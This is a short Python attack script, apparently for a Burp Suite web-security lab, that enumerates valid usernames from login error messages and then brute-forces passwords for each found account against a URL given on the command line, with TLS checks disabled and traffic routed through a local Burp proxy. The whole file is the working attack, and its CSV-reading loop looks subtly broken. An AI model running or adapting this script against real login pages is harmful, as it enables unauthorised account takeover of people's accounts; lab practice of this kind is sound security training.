import sys
import requests
import urllib3
import csv
import pandas as pd
# Suppress the insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Add proxy for troubleshoot, for urllib3 all proxies should use http
# Uses the Burp proxy -> Make sure Burp is running
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def username_enum(url):
    usernames = []
    valid_users = []
    data = pd.read_csv('./burp_users.csv')
    for user in data:
        usernames.append(user)
        #print(user)
        #print(usernames)
    
    for user in usernames:
        data = {
            "username": user,
            "password": "password"
        }
        r = requests.post(url, data = data, verify=False, proxies=proxies)
        if 'Invalid username' in r.text:
            print(f'[+] {user} not valid')
        else:
            print(f'***** {user} is valid user *****')
            valid_users.append(user)
    
    return valid_users       

def password_enum(valid_users):
    password_list = []
    data = pd.read_csv('./burp_pass.csv')
    for passw in data:
        password_list.append(passw)
        print(passw)
        
    for user in valid_users:
        for password in password_list:
            data = {
                "username": user,
                "password": password
            }
            r = requests.post(url, data=data, verify=False, proxies=proxies)
            if 'Incorrect password' not in r.text:
                print(f'***** {password} valid for {user} *****')
    

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)
    
    print('[-] Performing user enumeration')
    valid_usernames = username_enum(url)
    print(valid_usernames)
    print('[-] Performing password enumeration')
    valid_passwords = password_enum(valid_usernames)

